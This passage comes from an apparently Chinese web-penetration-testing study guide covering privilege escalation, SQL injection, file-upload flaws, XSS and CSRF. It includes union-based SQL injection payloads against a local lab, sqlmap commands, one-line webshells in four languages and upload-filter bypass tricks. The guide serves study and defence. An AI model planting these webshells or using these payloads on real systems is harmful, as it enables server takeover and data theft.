<li><p>网站目录和文件枚举：通过枚举Web目录和文件，获取目标Web应用程序的结构和文件，了解应用程序的架构和功能，扫描⽹站⽬录结构，爆后台，⽹站 banner，测试⽂件，备份等敏感⽂件泄漏等,可以使用工具如dirb和Gobuster来进行目录和文件枚举。</p>
</li>
<li><p>服务探测：通过服务探测，获取Web服务器、Web应用程序框架和后端数据库等服务的版本和配置信息，中间件版本，弱⼝令扫描等 ,服务器的相关信息（真实 ip，系统类型，版本，开放端⼝，WAF 等）,可以使用工具如Wappalyzer和WhatWeb来进行服务探测。</p>
</li>
<li><p>漏洞扫描：使用漏洞扫描工具对目标IP地址进行漏洞扫描，识别已知的漏洞和弱点，可以使用工具如Nessus和OpenVAS来进行漏洞扫描。</p>
</li>
<li><p>漏洞利用：对发现的漏洞进行利用，获取更多的权限和敏感信息，可以使用工具如Metasploit和sqlmap来进行漏洞利用。</p>
</li>
<li><p>密码攻击：通过密码猜测、暴力破解等方式攻击Web应用程序中的账号密码，可以使用工具如Hydra和Medusa来进行密码攻击。</p>
</li>
<li><p>社会工程学：使用社会工程学方法如钓鱼邮件、欺骗等手段，诱导用户泄露敏感信息或打开恶意链接，可以使用工具如SET和BeEF来进行社会工程学攻击。</p>
</li>
</ol>
<p>需要注意的是，在进行Web渗透测试时，必须遵守法律法规和道德规范，仅在获得授权的情况下进行渗透测试，不得非法侵入目标系统。</p>
<h3 id="主机渗透提权的方法："><a href="#主机渗透提权的方法：" class="headerlink" title="主机渗透提权的方法："></a>主机渗透提权的方法：</h3><p>在渗透测试中，提权是指攻击者通过各种手段获取更高的访问权限和系统权限，以便控制目标系统或获取更多的敏感信息。除了您提到的suid提权和脏牛提权之外，以下是几种常见的提权方法：</p>
<ol>
<li><p>内核漏洞提权：攻击者利用系统中的内核漏洞提权，例如使用CVE-2016-5195漏洞进行Dirty COW提权。</p>
</li>
<li><p>Sudo提权：攻击者利用Sudo命令的配置错误，以及Sudo的特殊设置，实现提权。</p>
</li>
<li><p>反弹Shell：攻击者在目标系统中执行恶意代码，将攻击者的Shell反弹回攻击者的机器，以实现提权。</p>
</li>
<li><p>用户配置文件提权：攻击者利用用户配置文件的设置，例如.bashrc或.profile等文件，执行特定的命令，以实现提权。</p>
</li>
<li><p>账号密码攻击：攻击者通过密码猜测、暴力破解等方式攻击系统中的账号密码，获取系统权限，例如使用Hydra和Medusa等工具进行密码攻击。</p>
</li>
<li><p>suid提权和脏牛提权是两种常见的Linux系统提权技术。</p>
<p>suid提权是指攻击者利用在Linux系统中拥有suid权限的二进制文件，以获取root权限的攻击方法。suid是一个文件属性标志，用于指示该程序运行时应以该程序的所有者权限运行。攻击者可以找到一个拥有suid位设置的具有root权限的二进制文件，并在该文件上执行漏洞，从而获得root权限。</p>
<p>脏牛提权利用了Linux内核中的一个本地提权漏洞，攻击者可以通过该漏洞修改系统中任何文件，包括文件的权限和所有权。脏牛提权的漏洞代码位于Linux内核的“内存映射区域”中，攻击者可以通过修改这部分内存来修改系统文件的权限和所有权，并在不需要root权限的情况下获得系统管理员权限。</p>
<p>需要注意的是，这些提权技术可能会在攻击者成功入侵系统的情况下带来危险，因此必须遵循法律和道德规范，仅在获得授权的情况下使用这些技术进行渗透测试。</p>
</li>
</ol>
<p>需要注意的是，在进行渗透测试时，必须遵守法律法规和道德规范，仅在获得授权的情况下进行渗透测试，不得非法侵入目标系统。</p>
<h3 id="1、SQL注入"><a href="#1、SQL注入" class="headerlink" title="1、SQL注入"></a>1、SQL注入</h3><h4 id="1-1、SQL注入原理"><a href="#1-1、SQL注入原理" class="headerlink" title="1.1、SQL注入原理"></a>1.1、SQL注入原理</h4><ol>
<li><p>sql注入定义</p>
<p>SQL注入是一种网络安全攻击，它指的是攻击者通过把恶意代码插入Web应用程序的SQL语句，以破坏数据库的完整性和稳定性。这种攻击的目的是窃取敏感数据，例如用户名和密码，或者控制Web应用程序的数据库。</p>
</li>
<li><p>sql注入原理</p>
<p>服务器端未严格校验客户端发送的数据，而导致服务器端SQL语句被恶意修改并成功执行的行为，其实质是将用户输入的数据拼接到原始代码中，从而使得被注入的数据被当做代码执行</p>
</li>
<li><p>sql注入出现的位置</p>
<p>一切与数据产生交集的地方，例如url传参、表单post、Cookie、User-Agent、X-Forwarded-For。</p>
</li>
<li><p>sql注入的危害</p>
<p>1.数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。</p>
<p>2.网页篡改：通过操作数据库对特定网页进行篡改。</p>
<p>3.网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。</p>
<p>4.数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被篡改。</p>
<p>5.服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。</p>
<p>6.破坏硬盘数据，瘫痪全系统。</p>
</li>
<li><p>手工注入的流程</p>
<p>判断是否存在注入</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">and 1=1		and 1=2		或者&#x27;	或者\  //探测漏洞是否存在</span><br></pre></td></tr></table></figure></div>

<p>判断字段数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">order by 3		//判断字段数，若报错则字段数不为3，没报错则字段数就是3</span><br></pre></td></tr></table></figure></div>

<p>判断输出点</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqil/Less-1/?id=111&#x27; union select 1,2,3 -- qq		//看输出什么数字，则输出点就在这个数字对应的位次上。</span><br></pre></td></tr></table></figure></div>

<p>查询表名</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqil/Less-1/?id=111&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() -- qq		//输出当前数据库下的表名</span><br></pre></td></tr></table></figure></div>

<p>查询字段名</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqil/Less-1/?id=111&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;要查的表名&#x27; -- qq		//查询users表下的字段名</span><br></pre></td></tr></table></figure></div>

<p>查询字段数据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqil/Less-1/?id=111&#x27; union select 1,group_concat(字段名),group_concat(字段名) from 要查的表名 -- qq		//查询username和password的数据</span><br></pre></td></tr></table></figure></div>

<p>以上就是一个完整的利用联合注入的手工注入。</p>
</li>
</ol>
<h4 id="1-2、SQL注入分类"><a href="#1-2、SQL注入分类" class="headerlink" title="1.2、SQL注入分类"></a>1.2、SQL注入分类</h4><h5 id="1-2-1、联合注入"><a href="#1-2-1、联合注入" class="headerlink" title="1.2.1、联合注入"></a>1.2.1、联合注入</h5><p>主要是利用union，UNION的作用是将两个select查询结果合并，只要让第一行查询的结果是空集，即union左边的select子句查询结果为空，那么union右边的查询结果自然就成为了第一行，打印在网页上了</p>
<h5 id="1-2-2、报错注入"><a href="#1-2-2、报错注入" class="headerlink" title="1.2.2、报错注入"></a>1.2.2、报错注入</h5><p>报错注入是一种利用报错信息，结合函数规则进行数据读取的一种注入攻击。</p>
<p>当没有回显点，但有报错信息时就可以使用报错注入。</p>
<p>主要是利用updataxml()函数和extractvalue()函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">updatexml(目标xml内容，xml文件路径，更新的内容)</span><br><span class="line">extractvalue(目标xml文档，xml路径)</span><br></pre></td></tr></table></figure></div>



<h5 id="1-2-3、盲注"><a href="#1-2-3、盲注" class="headerlink" title="1.2.3、盲注"></a>1.2.3、盲注</h5><p>盲注是指在服务器没有错误回显的时候完成的注入攻击	。</p>
<p>可以分为两类：</p>
<p>1.布尔盲注：</p>
<p>•页面有回显，但是不会显示具体的内容</p>
<p>•只会根据传参信息返回true和false</p>
<p>2.时间盲注：</p>
<p>•传参任何东西返回结果都一样</p>
<p>•页面返回值只有一种，true，无论输入任何值，返回情况都会按照正常的进行处理</p>
<p>•加入特定的时间函数，通过查看web页面返回的时间差来判断注入语句是否正确</p>
<p>常用函数：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">length() 函数 返回字符串的长度</span><br><span class="line">substr() 截取字符串 </span><br><span class="line">substr(str,m,n)   m 从第m个字符开始截取       n 截取后字符串长度为n</span><br><span class="line">concat() 字符串拼接函数</span><br><span class="line">ascii() 返回字符的ascii码   [将字符变为数字]</span><br><span class="line">sleep() 将程序挂起一段时间n为n秒</span><br><span class="line">if(expr1,expr2,expr3) 判断语句 如果第一个语句正确就执行第二个语句，如果错误执行第三个语句</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>布尔盲注主要是利用页面无回显点但是会根据结果返回true或者false，通过substr函数截取字符串输出进行判断。</p>
<p>时间盲注则是通过sleep函数，通过if判断，通过页面是否延迟来判断真假。</p>
<h5 id="1-2-3、宽字节注入"><a href="#1-2-3、宽字节注入" class="headerlink" title="1.2.3、宽字节注入"></a>1.2.3、宽字节注入</h5><p>宽字节注入主要是源于程序员设置数据库编码（GBK）与PHP编码（UTF-8）设置为不同的两个编码格式从而导致产生宽字节注入。如果数据库使用的的是GBK编码而PHP编码为UTF8就可能出现注入问题，说白了就是程序员为了防止SQL注入，就会调用宽字节注入涉及的函数，将单引号或双引号进行转义操作，转义无非便是在单或双引号前加上斜杠（\）进行转义 ，这样我们注入的单引号就不起作用了，我们需要在单引号前面加一个字符%df（这里可以是任意的字母，%aa也可以，但是前提是添加的字符的Ascii要大于128，两个字符才能组合成汉字 ，因为前一个ascii码要大于128，才到汉字的范围 ），要%df跟反斜线（\）组合成一个汉字就可以实现绕过。</p>
<p>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码（GBK就是常说的宽字节之一，实际上只有两字节）的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围）</p>
<p><strong>涉及函数：</strong></p>
<p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串</p>
<p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符</p>
<p>mysql_escape_string() 转义一个字符串</p>
<h5 id="1-2-3、堆叠注入"><a href="#1-2-3、堆叠注入" class="headerlink" title="1.2.3、堆叠注入"></a>1.2.3、堆叠注入</h5><p>堆叠注入与union联合注入类似，主要区别在于union或者union all执行的语句类型是有限的，而堆叠注入利用;作为分割可以执行多个任意的语句。</p>
<h5 id="1-2-4、二次注入"><a href="#1-2-4、二次注入" class="headerlink" title="1.2.4、二次注入"></a>1.2.4、二次注入</h5><p>二次注入：二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。 防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。 进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</p>
<h4 id="1-3、SQLmap"><a href="#1-3、SQLmap" class="headerlink" title="1.3、SQLmap"></a>1.3、SQLmap</h4><p>sqlmap是一款基于python编写的渗透测试工具，在sql检测和利用方面功能强大，支持多种数据库。</p>
<h5 id="sqlmap注入技术简介"><a href="#sqlmap注入技术简介" class="headerlink" title="sqlmap注入技术简介"></a>sqlmap注入技术简介</h5><p>–technique&#x3D;   （默认全部使用）</p>
<p>B    基于布尔的盲注</p>
<p>T    基于时间的盲注</p>
<p>E    基于报错的注入</p>
<p>U    基于UNION查询注入</p>
<p>S    基于多语句查询注入</p>
<h5 id="sqlmap获取目标方式"><a href="#sqlmap获取目标方式" class="headerlink" title="sqlmap获取目标方式"></a>sqlmap获取目标方式</h5><p><strong>1.指定目标url</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.10.1/sqli/Less-1/?id=1&quot;</span><br></pre></td></tr></table></figure></div>

<p><strong>2.从文件中获取多个url</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -m 1.txt</span><br></pre></td></tr></table></figure></div>

<p><strong>3.从文件中加载HTTP请求</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r url.txt</span><br></pre></td></tr></table></figure></div>

<p><strong>4.利用google获取目标</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -g &quot;inurl:\&quot;.php?id=1\&quot;&quot;</span><br></pre></td></tr></table></figure></div>

<p><strong>5.从burp日志中获取目标</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -l   burp.txt</span><br></pre></td></tr></table></figure></div>



<h5 id="sqlmap具体参数"><a href="#sqlmap具体参数" class="headerlink" title="sqlmap具体参数"></a>sqlmap具体参数</h5><table>
<thead>
<tr>
<th>–dbs</th>
<th align="center">枚举出所有数据库名</th>
</tr>
</thead>
<tbody><tr>
<td>–tables</td>
<td align="center">枚举出数据库中的所有表名</td>
</tr>
<tr>
<td>–columns</td>
<td align="center">枚举出指定表中的所有列</td>
</tr>
<tr>
<td>–dump</td>
<td align="center">导出数据表项</td>
</tr>
<tr>
<td>-D 数据库名</td>
<td align="center">指定要枚举的数据库</td>
</tr>
<tr>
<td>-T 数据表名</td>
<td align="center">指定要枚举的数据表</td>
</tr>
<tr>
<td>-C 字段名</td>
<td align="center">指定要枚举的字段</td>
</tr>
<tr>
<td>–os-shell</td>
<td align="center">使用该参数后，就可执行相应的系统命令</td>
</tr>
<tr>
<td>–batch</td>
<td align="center">交互界面默认全部为yes</td>
</tr>
<tr>
<td>-p</td>
<td align="center">指定注入的参数id</td>
</tr>
</tbody></table>
<h3 id="2、文件上传"><a href="#2、文件上传" class="headerlink" title="2、文件上传"></a>2、文件上传</h3><h4 id="2-1、文件上传漏洞"><a href="#2-1、文件上传漏洞" class="headerlink" title="2.1、文件上传漏洞"></a>2.1、文件上传漏洞</h4><h5 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h5><p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p>
<h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>在文件上传的功能处，若服务端脚本语言未对上传的文件进行严格验证和过滤，导致恶意用户上传恶意的脚本文件时，就有可能获取执行服务端命令的能力，这就是文件上传漏洞。文件上传漏洞对Web应用来说是一种非常严重的漏洞。</p>
<h5 id="高危点"><a href="#高危点" class="headerlink" title="高危点"></a>高危点</h5><p>相册、头像上传视频、照片分享附件上传（论坛发帖、邮箱）文件管理器</p>
<h4 id="2-2、webshell定义"><a href="#2-2、webshell定义" class="headerlink" title="2.2、webshell定义"></a>2.2、webshell定义</h4><p>WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器web目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载或者修改文件，操作数据库，执行任意命令等）。 WebShell后门隐蔽较性高，可以轻松穿越防火墙，访问WebShell时不会留下系统日志，只会在网站的web日志中留下一些数据提交记录</p>
<h4 id="2-3、通用各类型的一句话木马"><a href="#2-3、通用各类型的一句话木马" class="headerlink" title="2.3、通用各类型的一句话木马"></a>2.3、通用各类型的一句话木马</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%eval request (&quot;shell&quot;)%&gt;         //asp格式</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[value]);?&gt;     // php格式</span><br><span class="line"></span><br><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;value&quot;])%&gt;        //aspx格式</span><br><span class="line"></span><br><span class="line">&lt;%if(request.getParameter(&quot;f&quot;)!=null)(newjava.io.FileOutputStream(application.getRealPath(&quot;/&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes());%&gt;       //jsp格式</span><br></pre></td></tr></table></figure></div>

<h4 id="2-4、绕过方式"><a href="#2-4、绕过方式" class="headerlink" title="2.4、绕过方式"></a>2.4、绕过方式</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/%E6%80%BB%E7%BB%93%E7%9F%A5%E8%AF%86%E7%82%B9/qweqwe.png"
                     
                ></p>
<h4 id="2-5、漏洞危害"><a href="#2-5、漏洞危害" class="headerlink" title="2.5、漏洞危害"></a>2.5、漏洞危害</h4><p><strong>1、代码执行</strong></p>
<p>上传文件是web脚本语言，服务器的web容器解释并执行了用户上传的脚本，导致代码执行，甚至导致网站甚至整个服务器被控制</p>
<p><strong>2、域控制</strong></p>
<p>上传文件是flash的策略文件crossdomiain.xml，黑客用以控制flash在该域下的行为；</p>
<p><strong>3、网站挂马</strong></p>
<p>上传文件是病毒、木马，黑客用以诱骗用户或者管理员下载执行；</p>
<p><strong>4、钓鱼</strong></p>
<p>上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。</p>
<h4 id="2-6、上传漏洞满足条件"><a href="#2-6、上传漏洞满足条件" class="headerlink" title="2.6、上传漏洞满足条件"></a>2.6、上传漏洞满足条件</h4><p>首先，上传的文件能够被web容器解释执行。所以文件上传后所在的目录要是web容器所覆盖到的路径。</p>
<p>其次，用户能够从web访问这个文件。如果文件上传了，但用户无法通过web访问，或者无法得到web容器解释这个脚本，那么也不能称之为漏洞。 最后，用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容，则也可能导致攻击不成功。</p>
<h4 id="2-7、防御"><a href="#2-7、防御" class="headerlink" title="2.7、防御"></a>2.7、防御</h4><p>将上传文件与web服务隔离  白名单过滤、限制上传文件类型  文件上传路径设置为不可执行权限  检查文件上传路径  自带函数检测  自定义函数检测  图片渲染  对上传文件重命名  对文件内容压缩，重新生成文件内容  检查文件内容</p>
<h4 id="2-8、绕过"><a href="#2-8、绕过" class="headerlink" title="2.8、绕过"></a>2.8、绕过</h4><h5 id="前端-js绕过"><a href="#前端-js绕过" class="headerlink" title="前端 js绕过"></a>前端 js绕过</h5><p>浏览器关闭JavaScript功能<br>删除前端页面的JavaScript代码</p>
<h5 id="检测后缀-黑名单绕过"><a href="#检测后缀-黑名单绕过" class="headerlink" title="检测后缀-黑名单绕过"></a>检测后缀-黑名单绕过</h5><p>php3&#x2F;.php4&#x2F;.php5&#x2F;.phtml 都会被解析为php<br>jsp中，jspx、jspf<br>asp中，asa、cer、aspx<br>exe中，exee</p>
<h5 id="htaccess-绕过"><a href="#htaccess-绕过" class="headerlink" title=".htaccess 绕过"></a>.htaccess 绕过</h5><p>.htaccess文件：全称为Hypertext Access （超文本入口）<br>htaccess文件也被称为分布式配置文件，提供了针对目录改变配置的方法，在特定的文档目录中放置包含一个或多个指令的文件，以作用于此目录及其所有子目录<br>功能：文件夹密码保护、用户自定义重定向、自定义404页面、扩展名伪静态化、禁止特定IP地址的用<br>户、只允许特定的IP地址用户、禁止目录列表<br>默认情况下 不开启，自己写一个htaccess文件：AddType application&#x2F;x-httpd-php .jpg ，指令表示<br>.jpg文件会当做php来解析</p>
<p>在win10中可以使用cmd的重命名法创建.htaccess文件 ren 1.txt .htaccess<br>先上传带有木马的jpg文件，记录地址，再上传.htaccess</p>
<h5 id="后缀大小写绕过"><a href="#后缀大小写绕过" class="headerlink" title="后缀大小写绕过"></a>后缀大小写绕过</h5><p>.PhP</p>
<h5 id="点绕过"><a href="#点绕过" class="headerlink" title="点绕过"></a>点绕过</h5><p>windows特性<br>在Windows中会自动抹去后缀名中最后一个点<br>.php.</p>
<h5 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h5><p>php空格</p>
<h5 id="DATA-绕过"><a href="#DATA-绕过" class="headerlink" title="::$DATA 绕过"></a>::$DATA 绕过</h5><p>利用windows特性，可在后缀名中加”::DATA”绕过<br>Windows文件流绕过(::$DATA):如果硬盘不是NTFS就不能用<br>.php &lt;&#x3D;&#x3D;&gt; .php::$DATA</p>
<h5 id="双写后缀名绕过"><a href="#双写后缀名绕过" class="headerlink" title="双写后缀名绕过"></a>双写后缀名绕过</h5><p>phphpp</p>
<h5 id="配合解析漏洞绕过"><a href="#配合解析漏洞绕过" class="headerlink" title="配合解析漏洞绕过"></a>配合解析漏洞绕过</h5><p>图片马</p>
<h5 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h5><p>MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型，是设定某种扩展名的文件<br>用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来<br>打开，多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式</p>
<h5 id="00"><a href="#00" class="headerlink" title="%00"></a><strong>%00</strong></h5><p>因为在 C 语⾔中字符串的结束标识符 %00 是结束符号，⽽ PHP 就是 C 写的，所以继承了 C 的特性，所以判断为 %00 是结束符号不会继续往后执⾏ </p>
<p>条件：PHP&lt;5.3.29，且 GPC 关闭</p>
<h3 id="3、XSS注入（跨站脚本攻击）"><a href="#3、XSS注入（跨站脚本攻击）" class="headerlink" title="3、XSS注入（跨站脚本攻击）"></a>3、XSS注入（跨站脚本攻击）</h3><h4 id="3-1、定义"><a href="#3-1、定义" class="headerlink" title="3.1、定义"></a>3.1、定义</h4><ul>
<li><p>XSS中文叫做跨站脚本攻击（Cross-site scripting），本名应该缩写为CSS，但是由于CSS（Cascading Style Sheets，层叠样式脚本）重名，所以更名为XSS。XSS（跨站脚本攻击）主要基于javascript（js）来完成恶意的攻击行为。</p>
</li>
<li><p>XSS是指恶意攻击者利用网站对用户提交的数据进行转义处理或者过滤不足的缺点，进而添加一些代码，嵌入到web页面中去。使别的用户访问都会执行相应的嵌入代码。</p>
</li>
<li><p>从而盗取用户资料、利用用户身份进行某种动作或者访问者进行病毒侵害的一种攻击方式。</p>
</li>
</ul>
<h4 id="3-2、XSS原理"><a href="#3-2、XSS原理" class="headerlink" title="3.2、XSS原理"></a>3.2、XSS原理</h4><p>HTML是一种超文本标记语言，通过将一些字符特殊地对待来区别文本和标记，例如，小于符号（&lt;）被看作是HTML标签的开始，之间的字符是页面的标题等等。当动态页面中插入的内容含有这些特殊字符（如&lt;）时，用户浏览器会将其误认为是插入了HTML标签，<strong>当这些HTML标签引入了一段JavaScript脚本时，这些脚本程序就将会在用户浏览器中执行</strong>。所以，当这些特殊字符不能被动态页面检查或检查出现失误时，就将会产生XSS漏洞。</p>
<h4 id="3-3、XSS的危害"><a href="#3-3、XSS的危害" class="headerlink" title="3.3、XSS的危害"></a>3.3、XSS的危害</h4><ul>
<li><strong>针对用户</strong><ul>
<li>窃取cookie劫持的会话</li>
<li>网络钓鱼</li>
<li>放马挖矿</li>
<li>广告刷流量</li>
</ul>
</li>
<li><strong>针对web服务</strong><ul>
<li><strong>劫持后台</strong>（常见）</li>
<li>篡改页面</li>
<li>传播蠕虫</li>
<li><strong>内网扫描</strong>（常见）</li>
</ul>
</li>
</ul>
<h4 id="3-4、防护方法"><a href="#3-4、防护方法" class="headerlink" title="3.4、防护方法"></a>3.4、防护方法</h4><p>对字符实体 进⾏转义、使⽤ HTTP Only 来禁⽌ JavaScript 读取 Cookie 值、输⼊时校验、浏览器与 Web 应⽤端采⽤相同的字符编码。</p>
<h4 id="3-5、XSS类型"><a href="#3-5、XSS类型" class="headerlink" title="3.5、XSS类型"></a>3.5、XSS类型</h4><p>根据攻击的来源，XSS 攻击可分为存储型、反射型和 DOM 型三种。</p>
<h5 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h5><p>反射型也称为非持久型，这种类型的脚本是最常见的，也是使用最为广泛的一种，主要用于将恶意的脚本附加到URL地址的参数中。</p>
<p>反射型跨站脚本也称作非持久型、参数型跨站脚本、这类型的脚本是最常见的 ，也是使用最为广泛的一种，主要用于将恶意的脚本附加到URL地址的参数中。<br>一般使用的将构造好的URL发给受害者，诱导受害者点击触发，而且只执行一次，非持久化。</p>
<h5 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h5><p>攻击者将已经构造完成的恶意页面发送给用户，用户访问看似正常的页面后收到攻击，这类XSS通常无法直接在URL中看到恶意代码，具有较强的持久性和隐蔽性。</p>
<p>存储型XSS：持久性，代码是存储在web服务器中的，比如在个人信息或发表文章等地方插入代码，如果没有过滤或者过滤不严，那么这些代码将存储在服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫、盗窃cookie。每一个访问特定页面的用户，都会受到攻击。</p>
<p>特点：<br>XSS攻击代码存储于web server上；<br>攻击者一般是通过网站的留言、评论、博客、日志等功能（所有能够向web server输入内容的地方），将攻击代码存储到web server上的</p>
<p>存储型 XSS 的攻击步骤：</p>
<ol>
<li>攻击者将恶意代码提交到目标网站的数据库中。</li>
<li>用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。</li>
<li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</li>
<li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li>
</ol>
<p>这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。</p>
<h5 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h5><p>DOM型XSS无需和后端交互，而是基于JavaScript上，JS解析URL中恶意参数导致执行JS代码</p>
<p> DOM—based XSS漏洞是基于文档对象模型Document Object Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM—based XSS漏洞。</p>
<p>DOM 型 XSS 的攻击步骤：</p>
<ol>
<li>攻击者构造出特殊的 URL，其中包含恶意代码。</li>
<li>用户打开带有恶意代码的 URL。</li>
<li>用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。</li>
<li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li>
</ol>
<p>DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。  </p>
<p>DOM就是一个树状的模型，你可以编写Javascript代码根据dom一层一层的节点，去遍历&#x2F;获取&#x2F;修改对应<br>的节点,对象,值。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/%E6%80%BB%E7%BB%93%E7%9F%A5%E8%AF%86%E7%82%B9/adsfasdfasdfaesf.png"
                     
                ></p>
<h6 id="DOM型xxs演示"><a href="#DOM型xxs演示" class="headerlink" title="DOM型xxs演示"></a>DOM型xxs演示</h6><p>可能触发DOM型XSS的属性：</p>
<p>document.referer属性</p>
<p>window.name属性</p>
<p>location属性</p>
<p>innerHTML属性</p>
<p>documen.write属性</p>
<p>演示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/%E6%80%BB%E7%BB%93%E7%9F%A5%E8%AF%86%E7%82%B9/asdasd.png"
                     
                ></p>
<h3 id="4、CSRF"><a href="#4、CSRF" class="headerlink" title="4、CSRF"></a>4、CSRF</h3><h3 id="4-1、CSRF漏洞简介"><a href="#4-1、CSRF漏洞简介" class="headerlink" title="4.1、CSRF漏洞简介"></a>4.1、CSRF漏洞简介</h3><p>CSRF（Cross-site request forgery）跨站请求伪造：<strong>攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求</strong>。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的</p>
<h4 id="防护方法"><a href="#防护方法" class="headerlink" title="防护方法"></a>防护方法</h4><p>筛选出需要防范 CSRF 的⻚⾯然后嵌⼊ Token值</p>
